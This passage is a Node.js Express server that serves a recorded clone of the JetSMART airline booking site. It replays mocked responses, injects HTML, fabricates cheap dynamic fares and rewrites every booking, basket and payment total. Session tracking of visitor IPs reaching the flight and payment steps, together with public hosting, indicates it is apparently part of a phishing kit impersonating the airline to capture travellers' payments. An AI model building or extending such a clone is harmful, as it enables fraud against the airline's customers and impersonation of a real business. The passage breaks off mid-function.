const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { URL } = require('url');
const http = require('http');
const https = require('https');
const WebSocket = require('ws');
const cookieParser = require('cookie-parser');
const { v4: uuidv4 } = require('uuid');

const { extractFlightParams, normalizeDate, isFlightRelatedUrl, isFareCacheUrl } = require('./constants');
const { rewriteUrls } = require('./url-rewriter');
const { findMock, hashBody } = require('./mock-matcher');
const { buildStationLookup, transformFlightResponse, shiftFareCacheDates, autoDetectFlightParams } = require('./transformer');
const { injectHtml } = require('./injector');

// ─── Main Serve Function ──────────────────────────────────────────────────────

function serve(cloneDir, port) {
    console.log('Starting serve mode...');
    cloneDir = path.resolve(cloneDir);

    const loadCloneDir = (dir) => {
        if (!fs.existsSync(dir)) return null;
        dir = path.resolve(dir);
        const publicDir = path.join(dir, 'public');
        const mocksFile = path.join(dir, 'mocks.json');
        if (!fs.existsSync(publicDir) || !fs.existsSync(mocksFile)) return null;

        const mocks = JSON.parse(fs.readFileSync(mocksFile, 'utf8'));
        const stationLookup = buildStationLookup(mocks);
        let state = { localStorage: [], sessionStorage: [], cookies: [] };
        if (fs.existsSync(path.join(dir, 'state.json'))) state = JSON.parse(fs.readFileSync(path.join(dir, 'state.json'), 'utf8'));
        let meta = {};
        if (fs.existsSync(path.join(dir, 'meta.json'))) meta = JSON.parse(fs.readFileSync(path.join(dir, 'meta.json'), 'utf8'));

        let wsData = [];
        if (fs.existsSync(path.join(dir, 'ws-mocks.json'))) wsData = JSON.parse(fs.readFileSync(path.join(dir, 'ws-mocks.json'), 'utf8'));

        const recordedFlightParams = meta.recordedFlight || autoDetectFlightParams(mocks);
        return { publicDir, mocks, stationLookup, state, meta, wsData, recordedFlightParams };
    };

    const cloneRoundTrip = loadCloneDir(path.join(path.dirname(cloneDir), 'clone-ida-vuelta'));
    const cloneOneWay = loadCloneDir(path.join(path.dirname(cloneDir), 'clone-solo-ida'));

    if (!cloneRoundTrip || !cloneOneWay) {
        console.error('Missing either clone-ida-vuelta or clone-solo-ida directories.');
        process.exit(1);
    }


    const { multiplexPassengers } = require('./transformer');

    // ── Session Isolation Middleware ──────────────────────────────────────
    const app = express();
    app.use(cors());
    app.use(express.json({ limit: '50mb' }));
    app.use(express.urlencoded({ extended: true, limit: '50mb' }));
    app.use(express.text({ type: 'text/plain', limit: '50mb' }));
    app.use(express.raw({ type: '*/*', limit: '50mb' }));
    app.use(cookieParser());

    // In-memory store mapping session IDs to unique state objects
    const sessions = {};

    app.use((req, res, next) => {
        let sid = req.cookies.clone_session_id;
        if (!sid || !sessions[sid]) {
            sid = uuidv4();
            res.cookie('clone_session_id', sid, { httpOnly: true, path: '/' });
            sessions[sid] = {
                currentFlowStep: 'homepage',
                bookingCreated: false,
                notifiedIPs: { flight: new Set(), payment: new Set() },
                searchContext: {
                    recorded: { ...cloneRoundTrip.recordedFlightParams },
                    current: { ...cloneRoundTrip.recordedFlightParams },
                    selectedFlights: {
                        outboundFare: 0,
                        inboundFare: 0,
                        outboundKey: null,
                        inboundKey: null,
                        outboundBundle: 'BND0',
                        inboundBundle: 'BND0',
                        taxes: 0,
                        grandTotal: 0,
                        isClub: false
                    }
                }
            };
        }
        req.session = sessions[sid];
        next();
    });

    const getActiveData = (reqSession) => {
        if (!reqSession) return cloneRoundTrip || cloneOneWay;
        if (reqSession.searchContext && !reqSession.searchContext.current.returnDate && cloneOneWay) {
            return cloneOneWay;
        }
        return cloneRoundTrip || cloneOneWay;
    };

    // ── Deterministic Price Engine ────────────────────────────────────────
    function getDynamicFare(sellKey, isClub = false, isoDateOverride = null) {
        if (!sellKey || sellKey === 'None' || String(sellKey).trim() === '') return 0;
        const now = new Date();
        const timeSeed = `${now.getFullYear()}-${now.getMonth()}-${now.getDate()}-${now.getHours()}`;
        let hash = 0;
        const str = sellKey + timeSeed + (isoDateOverride || '');
        for (let i = 0; i < str.length; i++) {
            hash = ((hash << 5) - hash) + str.charCodeAt(i);
            hash |= 0;
        }
        hash = Math.abs(hash);
        let price = 0;

        // ~80% chance for a cheap fare (Base: ~23k - 40k) -> (Final including tax: ~51k - 71k)
        // ~20% chance for a standard fare (Base: ~45k - 195k) -> (Final including tax: ~77k - 250k)
        // Parse date from sellKey or override to actively apply realistic weekday pricing curves
        let flightDate = null;
        if (isoDateOverride) {
            flightDate = new Date(`${isoDateOverride}T12:00:00Z`);
        } else {
            const dateMatch = sellKey.match(/(\d{2}\/\d{2}\/\d{4})/);
            if (dateMatch) {
                flightDate = new Date(dateMatch[1]);
            }
        }

        let premium = 0;
        let cheapChance = 8; // 80% default

        if (flightDate) {
            const day = flightDate.getDay();
            // High Peak: Friday (5) & Sunday (0) -> Heavy markup, only 30% cheap
            if (day === 0 || day === 5) {
                premium = 25000 + (hash % 20000);
                cheapChance = 3;
            }
            // Mid Peak: Saturday (6) & Monday (1) -> Minor markup, 60% cheap
            else if (day === 6 || day === 1) {
                premium = 12000 + (hash % 12000);
                cheapChance = 6;
            }
            // Off-Peak: Tuesday (2), Wednesday (3), Thursday (4) -> Promotions, 90% cheap
            else {
                premium = -(hash % 4000);
                cheapChance = 9;
            }
        }

        if (hash % 10 < cheapChance) {
            price = 23000 + (hash % 17000) + premium;
        } else {
            price = 45000 + (hash % 150000) + premium;
        }

        if (isClub) {
            price = Math.floor(price * 0.85);
        }

        return Math.floor(price / 1000) * 1000;
    }

    // ── Deterministic Tax Engine ──────────────────────────────────────────
    function getDynamicTax(baseFare) {
        if (!baseFare) return 0;
        // Realistic Colombia domestic taxes:
        // - Boarding tax: fixed 23,650 COP per leg
        // - IVA (VAT): exactly 19% of base fare
        return 23650 + Math.floor(baseFare * 0.19);
    }

    // ── Bundle Cost Engine ──────────────────────────────────────────────
    const bundleDiffMap = {};
    const fpMock = getActiveData().mocks.find(m => m.url && m.url.toLowerCase().includes('/flight/flightpagedata'));
    if (fpMock && typeof fpMock.response.body === 'string') {
        try {
            const fpParsed = JSON.parse(fpMock.response.body);
            const scrapeBundles = (journeys) => {
                if (!journeys) return;
                let flights = journeys.Flights || [];
                if (journeys.DateFlights) {
                    journeys.DateFlights.forEach(df => {
                        if (df.Flights) flights = flights.concat(df.Flights);
                    });
                }
                flights.forEach(f => {
                    if (Array.isArray(f.NormalBundleOffers)) {
                        f.NormalBundleOffers.forEach(o => {
                            if (o.SellKey && o.BundleCode) {
                                bundleDiffMap[o.SellKey + '|' + o.BundleCode] = o.UnFormattedPriceDifference || 0;
                            }
                        });
                    }
                });
            };
            scrapeBundles(fpParsed.Outbound);
            scrapeBundles(fpParsed.Inbound);
        } catch (e) { }
    }

    function getBundleDiff(sellKey, bundleCode) {
        if (!sellKey || sellKey === 'None' || String(sellKey).trim() === '') return 0;
        if (!bundleCode || bundleCode === 'BND0') return 0;
        const mapKey = sellKey + '|' + bundleCode;
        if (bundleDiffMap[mapKey] !== undefined) return bundleDiffMap[mapKey];
        if (bundleCode === 'BND1') return 121529; // Pack SMART diff fallback
        if (bundleCode === 'BND2') return 135660; // Pack FULL diff fallback
        return 0; // Default to 0 for unknown
    }

    // ── Helpers ────────────────────────────────────────────────────────────
    const LOCAL_BASE = process.env.PUBLIC_URL || `http://localhost:${port}`;

    function getHosts() {
        try {
            return fs.readdirSync(getActiveData().publicDir)
                .filter(f => fs.statSync(path.join(getActiveData().publicDir, f)).isDirectory());
        } catch { return []; }
    }

    function findStaticFile(reqPath) {
        const hosts = getHosts();
        const candidates = [reqPath];
        if (reqPath.endsWith('/')) candidates.push(reqPath + 'index.html');
        if (reqPath === '/') candidates.push('/index.html');

        for (const host of hosts) {
            for (const p of candidates) {
                const fp = path.join(getActiveData().publicDir, host, p);
                if (fs.existsSync(fp) && fs.statSync(fp).isFile()) return { filePath: fp, host };
            }
        }
        return null;
    }

    /** Preferred host for SPA fallback based on URL path. */
    function getPreferredHost(reqPath) {
        const hosts = getHosts();
        if (hosts.length === 0) return null;
        const bookingHost = hosts.find(h => h.includes('booking'));
        const mainHost = hosts.find(h => h.includes('jetsmart') && !h.includes('booking')) || hosts[0];
        return reqPath.startsWith('/V2') ? (bookingHost || mainHost) : mainHost;
    }

    // ── ClientAppData Flow Adjustment ──────────────────────────────────
    // The SPA uses ClientAppData to determine where in the booking flow
    // the user is. Since we recorded the entire flow, the LAST recorded
    // ClientAppData reflects the payment stage. We must adjust it so the
    // SPA doesn't redirect away from the current step.

    function adjustClientAppData(body, currentFlowStep) {
        if (!body || typeof body !== 'object') return body;
        const adjusted = JSON.parse(JSON.stringify(body));

        // If user is at flight selection, the SPA expects HasBooking=false
        // (booking hasn't been created yet until flights are selected)
        if (currentFlowStep === 'flight-results' || currentFlowStep === 'flight-search') {
            if (adjusted.FlowInfo) {
                adjusted.FlowInfo.HasBooking = false;
            }
        }
        // For all other steps (baggage, seatmap, etc.), HasBooking=true is correct
        return adjusted;
    }

    // ── Mock Response Handler ─────────────────────────────────────────────

    function handleMock(req, res, targetUrl) {
        let reqBody = req.body;
        if (Buffer.isBuffer(reqBody)) reqBody = reqBody.toString('utf8');
        const reqHash = hashBody(reqBody);

        const result = findMock(getActiveData().mocks, targetUrl, req.method, reqHash);
        if (!result) {
            console.log(`❌ Miss: [${req.method}] ${targetUrl.substring(0, 120)}`);
            return false;
        }

        const { mock, matchType } = result;
        const mockRes = mock.response;

        // Skip 304 Not Modified responses with no body — the visitor's browser
        // won't have the file cached, so we need to fetch the real content.
        if (mockRes.status === 304 && !mockRes.body) {
            console.log(`⚠️  Skipping 304 no-body mock (will proxy): ${targetUrl.substring(0, 120)}`);
            return false;
        }

        if (matchType !== 'exact') {
            console.log(`🔀 ${matchType} match: [${req.method}] ${targetUrl.substring(0, 120)}`);
        } else {
            console.log(`✅ Mock: [${req.method}] ${targetUrl.substring(0, 120)}`);
        }

        // Forward safe headers
        const skipHeaders = new Set([
            'content-security-policy', 'content-security-policy-report-only',
            'content-encoding', 'content-length', 'transfer-encoding',
            'access-control-allow-origin'
        ]);
        for (const [h, v] of Object.entries(mockRes.headers || {})) {
            if (skipHeaders.has(h.toLowerCase())) continue;
            let val = v;
            if (h.toLowerCase() === 'location' && val) val = rewriteUrls(val, LOCAL_BASE);
            res.setHeader(h, val);
        }
        res.setHeader('Access-Control-Allow-Origin', '*');
        res.status(mockRes.status);

        let body = mockRes.body;

        // ── Flow-dependent response adjustments ───────────────────────
        const urlLower = targetUrl.toLowerCase();

        // ── Early Transformations ──────────────────────────────────────
        const shouldTransformFlight = req.session.searchContext.current.origin
            && (matchType !== 'exact' || isFlightRelatedUrl(targetUrl));
        const shouldShiftFareCache = isFareCacheUrl(targetUrl);

        if (shouldShiftFareCache && mockRes.isJson && req.session.searchContext.recorded.departureDate) {
            body = shiftFareCacheDates(body, req.session.searchContext.recorded.departureDate);
            if (shouldTransformFlight) {
                body = transformFlightResponse(body, req.session.searchContext.recorded, req.session.searchContext.current, getActiveData().stationLookup, { skipDates: true });
            }
            console.log(`📅 Fare-cache shifted + transformed`);
        } else if (shouldTransformFlight) {
            const rec = req.session.searchContext.recorded;
            body = transformFlightResponse(body, rec, req.session.searchContext.current, getActiveData().stationLookup);
            console.log(`🔄 Transformed: ${rec.origin}→${rec.destination} ⇒ ${req.session.searchContext.current.origin}→${req.session.searchContext.current.destination}`);
        }

        // ── Dynamic Pricing: Search Results ─────────────────────────────
        if (urlLower.includes('/flight/flightpagedata') && mockRes.isJson) {
            let parsed = typeof body === 'string' ? JSON.parse(body) : body;
            const applyDynamicPrices = (journeys, requestedIsoDate = null) => {
                if (!journeys) return;

                const cheapestPerDay = {};

                let flights = journeys.Flights || [];
                if (journeys.DateFlights) {
                    journeys.DateFlights.forEach(df => {
                        if (df.Flights) flights = flights.concat(df.Flights);
                    });
                }

                flights.forEach(f => {
                    let lowestBase = null;
                    const updateOffer = (offer, isClub = false) => {
                        if (offer.SellKey && offer.UnFormattedPrice !== undefined) {
                            const dynBase = getDynamicFare(offer.SellKey, isClub, requestedIsoDate);
                            if (!isClub) {
                                if (lowestBase === null || dynBase < lowestBase) lowestBase = dynBase;
                            }

                            const taxPerWay = getDynamicTax(dynBase);
                            const bundleDiff = offer.UnFormattedPriceDifference || 0;

                            const finalPrice = dynBase + taxPerWay + bundleDiff;
                            offer.UnFormattedPrice = finalPrice;
                            if (offer.UnFormattedPriceInUsd) offer.UnFormattedPriceInUsd = parseFloat((finalPrice / 3800).toFixed(2));
                        }
                    };

                    if (Array.isArray(f.NormalBundleOffers)) f.NormalBundleOffers.forEach(o => updateOffer(o, false));
                    if (Array.isArray(f.DcBundleOffers)) f.DcBundleOffers.forEach(o => updateOffer(o, true));

                    if (lowestBase !== null && f.CheapestPrice !== undefined) {
                        const finalPrice = lowestBase + getDynamicTax(lowestBase);
                        f.CheapestPrice = finalPrice;

                        // Map cheapest flight to its specific day (YYYY-MM-DD pattern extraction)
                        if (requestedIsoDate) {
                            if (!cheapestPerDay[requestedIsoDate] || finalPrice < cheapestPerDay[requestedIsoDate]) {
                                cheapestPerDay[requestedIsoDate] = finalPrice;
                            }
                        } else {
                            const sampleOffer = (f.NormalBundleOffers && f.NormalBundleOffers[0]) || (f.DcBundleOffers && f.DcBundleOffers[0]);
                            if (sampleOffer && sampleOffer.SellKey) {
                                const dateMatch = sampleOffer.SellKey.match(/(\d{2})\/(\d{2})\/(\d{4})/);
                                if (dateMatch) {
                                    const isoDate = `${dateMatch[3]}-${dateMatch[1]}-${dateMatch[2]}`; // YYYY-MM-DD
                                    if (!cheapestPerDay[isoDate] || finalPrice < cheapestPerDay[isoDate]) {
                                        cheapestPerDay[isoDate] = finalPrice;
                                    }
                                }
                            }
                        }
                    }
                });

                // Inject cheapest known representation into the week-switcher carousel mathematically 
                if (Array.isArray(journeys.WeekCarousel)) {
                    journeys.WeekCarousel.forEach(wc => {
                        if (wc.Date && wc.UnformattedPrice !== undefined) {
                            if (cheapestPerDay[wc.Date]) {
                                wc.UnformattedPrice = cheapestPerDay[wc.Date];
                            } else {
                                // Fallback generated price if flights for that day aren't cached locally in JSON
                                const fakeBase = getDynamicFare(`${journeys.OriginIata}~~${journeys.DestinationIata}`, false, wc.Date);
                                wc.UnformattedPrice = fakeBase + getDynamicTax(fakeBase);
                            }
                        }
                    });
                }
            };

            if (parsed.Outbound) applyDynamicPrices(parsed.Outbound, req.session.searchContext.current.departureDate);
            if (parsed.Inbound) applyDynamicPrices(parsed.Inbound, req.session.searchContext.current.returnDate);
            body = typeof body === 'string' ? JSON.stringify(parsed) : parsed;
        }

        const decodeSellKeySafe = (sk) => {
            if (!sk) return sk;
            let dec = decodeURIComponent(sk);
            if (!dec.includes('~')) {
                dec = Buffer.from(dec.replace(/ /g, '+'), 'base64').toString('utf8');
            }
            return dec;
        };

        // ── Dynamic Pricing: Flight Selection ─────────────────────────────
        if (req.method === 'POST' && (urlLower.includes('/flightselection') || urlLower.includes('/flight/select'))) {
            try {
                const rawBody = req.rawBody || (typeof reqBody === 'string' ? reqBody : (Buffer.isBuffer(reqBody) ? reqBody.toString('utf8') : ''));
                const formFields = {};
                const parts = rawBody.split(/------WebKitFormBoundary[^\r\n]*/);
                parts.forEach(part => {
                    const nameMatch = part.match(/name="([^"]+)"/);
                    if (nameMatch) {
                        const val = part.split('\r\n\r\n')[1]?.replace(/\r\n$/, '').trim();
                        if (val) formFields[nameMatch[1]] = val;
                    }
                });

                if (formFields['OutboundBundleCode']) req.session.searchContext.selectedFlights.outboundBundle = formFields['OutboundBundleCode'];
                if (formFields['InboundBundleCode']) req.session.searchContext.selectedFlights.inboundBundle = formFields['InboundBundleCode'];

                if (formFields['ApplyDiscount']) req.session.searchContext.selectedFlights.isClub = formFields['ApplyDiscount'] === 'true';

                if (formFields['OutboundSellKey']) {
                    req.session.searchContext.selectedFlights.outboundKey = decodeSellKeySafe(formFields['OutboundSellKey']);
                    req.session.searchContext.selectedFlights.outboundFare = getDynamicFare(req.session.searchContext.selectedFlights.outboundKey, req.session.searchContext.selectedFlights.isClub, req.session.searchContext.current.departureDate) + getBundleDiff(req.session.searchContext.selectedFlights.outboundKey, req.session.searchContext.selectedFlights.outboundBundle);
                }
                if (formFields['InboundSellKey']) {
                    req.session.searchContext.selectedFlights.inboundKey = decodeSellKeySafe(formFields['InboundSellKey']);
                    req.session.searchContext.selectedFlights.inboundFare = getDynamicFare(req.session.searchContext.selectedFlights.inboundKey, req.session.searchContext.selectedFlights.isClub, req.session.searchContext.current.returnDate) + getBundleDiff(req.session.searchContext.selectedFlights.inboundKey, req.session.searchContext.selectedFlights.inboundBundle);
                }
                console.log(`💰 Selected Fares: Outbound=${req.session.searchContext.selectedFlights.outboundFare} (${req.session.searchContext.selectedFlights.outboundBundle}), Inbound=${req.session.searchContext.selectedFlights.inboundFare} (${req.session.searchContext.selectedFlights.inboundBundle}), DC=${req.session.searchContext.selectedFlights.isClub}`);
            } catch (e) { /* ignore */ }
        }

        // ── Dynamic Pricing: Booking Summary / Basket Update ─────────────
        if (mockRes.isJson) {
            let parsed = typeof body === 'string' ? JSON.parse(body) : body;
            let modified = false;

            let effectiveOutboundBase = getDynamicFare(req.session.searchContext.selectedFlights.outboundKey, req.session.searchContext.selectedFlights.isClub, req.session.searchContext.current.departureDate);
            let effectiveInboundBase = getDynamicFare(req.session.searchContext.selectedFlights.inboundKey, req.session.searchContext.selectedFlights.isClub, req.session.searchContext.current.returnDate);
            let effectiveOutboundFare = effectiveOutboundBase + getBundleDiff(req.session.searchContext.selectedFlights.outboundKey, req.session.searchContext.selectedFlights.outboundBundle);
            let effectiveInboundFare = effectiveInboundBase + getBundleDiff(req.session.searchContext.selectedFlights.inboundKey, req.session.searchContext.selectedFlights.inboundBundle);

            // 1. Live overrides during Flight Selection (Preview mode)
            if (urlLower.includes('/breakdown/get') && targetUrl.includes('?')) {
                const searchParams = new URL(targetUrl).searchParams;
                const qsKeys = searchParams.getAll('SellKeys') || [];
                const qsBundles = searchParams.getAll('BundleCodes') || [];

                if (searchParams.get('jetSmartPassengerDiscount.ApplyPaxDiscount') === 'true') req.session.searchContext.selectedFlights.isClub = true;

                if (qsKeys.length > 0 && qsKeys[0]) {
                    req.session.searchContext.selectedFlights.outboundKey = decodeSellKeySafe(qsKeys[0]);
                    req.session.searchContext.selectedFlights.outboundBundle = qsBundles[0] || 'BND0';
                    effectiveOutboundBase = getDynamicFare(req.session.searchContext.selectedFlights.outboundKey, req.session.searchContext.selectedFlights.isClub, req.session.searchContext.current.departureDate);
                    effectiveOutboundFare = effectiveOutboundBase + getBundleDiff(req.session.searchContext.selectedFlights.outboundKey, qsBundles[0]);
                }
                if (qsKeys.length > 1 && qsKeys[1]) {
                    req.session.searchContext.selectedFlights.inboundKey = decodeSellKeySafe(qsKeys[1]);
                    req.session.searchContext.selectedFlights.inboundBundle = qsBundles[1] || 'BND0';
                    effectiveInboundBase = getDynamicFare(req.session.searchContext.selectedFlights.inboundKey, req.session.searchContext.selectedFlights.isClub, req.session.searchContext.current.returnDate);
                    effectiveInboundFare = effectiveInboundBase + getBundleDiff(req.session.searchContext.selectedFlights.inboundKey, qsBundles[1]);
                }
            } else if (urlLower.includes('/bundleofferdetailsbytype') && req.method === 'POST') {
                try {
                    const reqBodyObj = typeof reqBody === 'string' ? JSON.parse(reqBody) : reqBody;
                    if (reqBodyObj.SellKeyOut && reqBodyObj.SellKeyOut !== 'None') {
                        effectiveOutboundBase = getDynamicFare(decodeSellKeySafe(reqBodyObj.SellKeyOut), req.session.searchContext.selectedFlights.isClub, req.session.searchContext.current.departureDate);
                        effectiveOutboundFare = effectiveOutboundBase; // Assuming bundles aren't updated here
                    }
                    if (reqBodyObj.SellKeyBack && reqBodyObj.SellKeyBack !== 'None') {
                        effectiveInboundBase = getDynamicFare(decodeSellKeySafe(reqBodyObj.SellKeyBack), req.session.searchContext.selectedFlights.isClub, req.session.searchContext.current.returnDate);
                        effectiveInboundFare = effectiveInboundBase;
                    }
                } catch (e) { }
            }

            if (effectiveOutboundFare > 0 || effectiveInboundFare > 0) {
                const requestedAdults = parseInt(req.session.searchContext.current.adults || '1', 10);
                const requestedChildren = parseInt(req.session.searchContext.current.children || '0', 10);
                const paxCount = requestedAdults + requestedChildren || 1;

                const perPaxOutboundFare = effectiveOutboundFare;
                const perPaxInboundFare = effectiveInboundFare;
                const perPaxOutboundBase = effectiveOutboundBase;
                const perPaxInboundBase = effectiveInboundBase;

                const totalFare = (effectiveOutboundFare + effectiveInboundFare) * paxCount;
                const outboundTax = getDynamicTax(perPaxOutboundBase) * paxCount;
                const inboundTax = getDynamicTax(perPaxInboundBase) * paxCount;

                const dynamicTaxes = outboundTax + inboundTax;

                req.session.searchContext.selectedFlights.taxes = dynamicTaxes; // sync up state
                const grandTotal = totalFare + dynamicTaxes;
                req.session.searchContext.selectedFlights.grandTotal = grandTotal;

                // Scale effective metrics for full journey overrides
                effectiveOutboundFare *= paxCount;
                effectiveInboundFare *= paxCount;
                effectiveOutboundBase *= paxCount;
                effectiveInboundBase *= paxCount;

                // V2XHR GetBookingData and all other endpoints returning BookingSummary
                if (parsed.BookingSummary) {
                    if (parsed.BookingSummary.TotalAmount !== undefined) { parsed.BookingSummary.TotalAmount = grandTotal; modified = true; }
                    if (parsed.BookingSummary.TotalPriceLocal !== undefined) { parsed.BookingSummary.TotalPriceLocal = grandTotal; modified = true; }
                    if (parsed.BookingSummary.TotalTransactionAmountLocal !== undefined) { parsed.BookingSummary.TotalTransactionAmountLocal = grandTotal; modified = true; }
                    if (parsed.BookingSummary.BalanceDue !== undefined) { parsed.BookingSummary.BalanceDue = grandTotal; modified = true; }

                    // The sidebar subtotals come from these nested arrays
                    const updateJourneys = (journeys, fakePrice, correctTax) => {
                        if (Array.isArray(journeys)) {
                            journeys.forEach(j => {
                                if (j.FareAmount !== undefined) { j.FareAmount = fakePrice; modified = true; }
                                if (j.FareAmountWithTaxes !== undefined) { j.FareAmountWithTaxes = fakePrice + correctTax; modified = true; }
                                if (Array.isArray(j.Flights)) {
                                    j.Flights.forEach(f => {
                                        if (f.FareAmount !== undefined) { f.FareAmount = fakePrice; modified = true; }
                                    });
                                }
                            });
                        }
                    };
                    updateJourneys(parsed.BookingSummary.AvailableOutboundJourneys, effectiveOutboundFare, outboundTax);
                    if (effectiveInboundFare > 0) {
                        updateJourneys(parsed.BookingSummary.AvailableReturnJourneys, effectiveInboundFare, inboundTax);
                    } else if (parsed.BookingSummary.AvailableReturnJourneys) {
                        updateJourneys(parsed.BookingSummary.AvailableReturnJourneys, 0, 0);
                    }
                }

                // Deep Breakdown/Get and Booking Summary nested Journeys
                const bs = parsed.BookingSummary || (parsed.Data && parsed.Data.BookingSummary);
                if (bs) {
                    if (bs.TotalAmount !== undefined) { bs.TotalAmount = grandTotal; modified = true; }
                    if (bs.TotalPriceLocal !== undefined) { bs.TotalPriceLocal = grandTotal; modified = true; }
                    if (bs.TotalTransactionAmountLocal !== undefined) { bs.TotalTransactionAmountLocal = grandTotal; modified = true; }
                    if (bs.BalanceDue !== undefined) { bs.BalanceDue = grandTotal; modified = true; }

                    const adjustJourney = (jrn, fakePrice, taxAmount) => {
                        if (!jrn) return;
                        if (jrn.FareAmount !== undefined) { jrn.FareAmount = fakePrice; modified = true; }
                        if (jrn.FareAmountWithTaxes !== undefined) { jrn.FareAmountWithTaxes = fakePrice + taxAmount; modified = true; }
                        if (Array.isArray(jrn.ServiceCharges)) {
                            let baseCharge = jrn.ServiceCharges.find(c => (c.ChargeCode === "" || c.ChargeCode === null));
                            if (baseCharge) { baseCharge.Amount = fakePrice; modified = true; }
                        }
                        if (Array.isArray(jrn.Segments)) {
                            jrn.Segments.forEach(seg => {
                                if (seg.FareAmount !== undefined) { seg.FareAmount = fakePrice; modified = true; }
                                if (Array.isArray(seg.ServiceCharges)) {
                                    let segBaseCharge = seg.ServiceCharges.find(c => (c.ChargeCode === "" || c.ChargeCode === null));
                                    if (segBaseCharge) { segBaseCharge.Amount = fakePrice; modified = true; }
                                }
                            });
                        }
                    };

                    adjustJourney(bs.OutboundJourney, effectiveOutboundFare, outboundTax);
                    if (effectiveInboundFare > 0) {
                        adjustJourney(bs.ReturnJourney, effectiveInboundFare, inboundTax);
                    } else if (bs.ReturnJourney) {
                        adjustJourney(bs.ReturnJourney, 0, 0);
                    }

                    if (Array.isArray(bs.Passengers)) {
                        bs.Passengers.forEach(p => {
                            if (p.Fare !== undefined) { p.Fare = perPaxOutboundFare + perPaxInboundFare; modified = true; }
                            if (p.PassengerTotal !== undefined) { p.PassengerTotal = grandTotal / paxCount; modified = true; }
                        });
                    }

                    if (Array.isArray(bs.Journeys)) {
                        if (urlLower.includes('/breakdown/get')) {
                            // Extract precisely what the user clicked from the URL
                            const searchParams = new URL(targetUrl).searchParams;
                            const qsKeys = searchParams.getAll('SellKeys');
                            const qsBundles = searchParams.getAll('BundleCodes') || [];

                            let sumFares = 0;
                            let dynamicTaxesBreakdown = 0;
                            bs.Journeys.forEach((journey, i) => {
                                if (qsKeys[i]) {
                                    const isOutbound = i === 0;
                                    const dynBase = getDynamicFare(decodeSellKeySafe(qsKeys[i]), req.session.searchContext.selectedFlights.isClub, isOutbound ? req.session.searchContext.current.departureDate : req.session.searchContext.current.returnDate);
                                    const bundleDiff = getBundleDiff(decodeSellKeySafe(qsKeys[i]), qsBundles[i]);
                                    const fare = (dynBase + bundleDiff) * paxCount;
                                    journey.Price = fare;
                                    journey.Subtotal = fare;
                                    sumFares += fare;

                                    // Normally taxes are calculated purely on the base fare, not the bundle. Let's calculate exactly based on dynBase
                                    dynamicTaxesBreakdown += getDynamicTax(dynBase) * paxCount;
                                }
                            });
                            if (bs.PassengerTotal !== undefined) bs.PassengerTotal = sumFares;
                            if (bs.TotalAmount !== undefined) bs.TotalAmount = sumFares + dynamicTaxesBreakdown;
                            modified = true;
                        } else {
                            if (bs.Journeys[0] && effectiveOutboundFare > 0) {
                                bs.Journeys[0].Price = effectiveOutboundFare;
                                bs.Journeys[0].Subtotal = effectiveOutboundFare;
                                modified = true;
                            }
                            if (bs.Journeys[1] && effectiveInboundFare > 0) {
                                bs.Journeys[1].Price = effectiveInboundFare;
                                bs.Journeys[1].Subtotal = effectiveInboundFare;
                                modified = true;
                            }
                        }
                    }
                }

                // ClientAppData Get and endpoints returning Basket
                if (parsed.State && parsed.State.Basket) {
                    if (parsed.State.Basket.AmountTotal !== undefined) { parsed.State.Basket.AmountTotal = grandTotal; modified = true; }
                }
                if (parsed.Basket) {
                    if (parsed.Basket.Amount !== undefined) { parsed.Basket.Amount = grandTotal; modified = true; }
                    if (parsed.Basket.BookingTotalAmount !== undefined) { parsed.Basket.BookingTotalAmount = grandTotal; modified = true; }
                    if (parsed.Basket.BalanceDue !== undefined) {
                        // BalanceDue in Basket is sometimes a string like "380976.0000"
                        parsed.Basket.BalanceDue = typeof parsed.Basket.BalanceDue === 'string' ? `${grandTotal}.0000` : grandTotal;
                        modified = true;
                    }
                }

                // Endpoints returning raw totals
                if (parsed.Amount !== undefined && parsed.Status !== undefined) {
                    // e.g., Payment endpoints
                    if (parsed.Amount === 380976 || parsed.Amount === 409774 || parsed.Amount > 10000) { parsed.Amount = grandTotal; modified = true; }
                }

                // Payment / Review page structures
                if (parsed.TealiumInfo) {
                    if (parsed.TealiumInfo.BookingTotalAmount !== undefined) { parsed.TealiumInfo.BookingTotalAmount = grandTotal; modified = true; }
                    if (parsed.TealiumInfo.TotalFare !== undefined) { parsed.TealiumInfo.TotalFare = req.session.searchContext.selectedFlights.grandTotal - req.session.searchContext.selectedFlights.taxes; modified = true; }
                    if (parsed.TealiumInfo.BookingTotalTax !== undefined) { parsed.TealiumInfo.BookingTotalTax = req.session.searchContext.selectedFlights.taxes; modified = true; }
                }

                if (parsed.VoucherAndGiftcardViewModel && parsed.VoucherAndGiftcardViewModel.BalanceDue !== undefined) {
                    parsed.VoucherAndGiftcardViewModel.BalanceDue = typeof parsed.VoucherAndGiftcardViewModel.BalanceDue === 'string' ? `${grandTotal}.0000` : grandTotal;
                    modified = true;
                }

                if (parsed.BookingViewModel && parsed.BookingViewModel.BalanceDue !== undefined) {
                    parsed.BookingViewModel.BalanceDue = typeof parsed.BookingViewModel.BalanceDue === 'string' ? `${grandTotal}.0000` : grandTotal;
                    modified = true;
                }

                if (parsed.AmountPerCurrency && parsed.AmountPerCurrency.COP && parsed.AmountPerCurrency.COP.Amount !== undefined) {
                    parsed.AmountPerCurrency.COP.Amount = typeof parsed.AmountPerCurrency.COP.Amount === 'string' ? `${grandTotal}.0000` : grandTotal;
                    modified = true;
                }

                if (parsed.MethodsViewModel && parsed.MethodsViewModel.InstallmentsXml) {
                    Object.values(parsed.MethodsViewModel.InstallmentsXml).forEach(inst => {
                        if (inst && Array.isArray(inst.Options)) {
                            inst.Options.forEach(opt => {
                                if (opt.TotalAmount !== undefined) { opt.TotalAmount = grandTotal; modified = true; }
                                if (opt.BaseAmount !== undefined) { opt.BaseAmount = grandTotal; modified = true; }
                            });
                        }
                    });
                }

                // BundleOfferDetailsByType
                if (parsed.UnformattedNormalTotalPrice !== undefined) {
                    const priceLocal = grandTotal.toLocaleString('es-CO');
                    parsed.UnformattedNormalTotalPrice = grandTotal;
                    parsed.FormattedNormalTotalPrice = `$ ${priceLocal} COP`;

                    // Standard/Group pricing is usually discounted by JetSmart Club (~14%), but for this sandbox,
                    // we can just make it the same, or dynamically discount it. Let's make it match to avoid mismatches.
                    if (parsed.UnformattedStandardTotalPrice !== undefined) {
                        const standardPrice = grandTotal; // or Math.floor(grandTotal * 0.85);
                        const standardStr = standardPrice.toLocaleString('es-CO');
                        parsed.UnformattedStandardTotalPrice = standardPrice;
                        parsed.FormattedStandardTotalPrice = `$ ${standardStr} COP`;
                    }
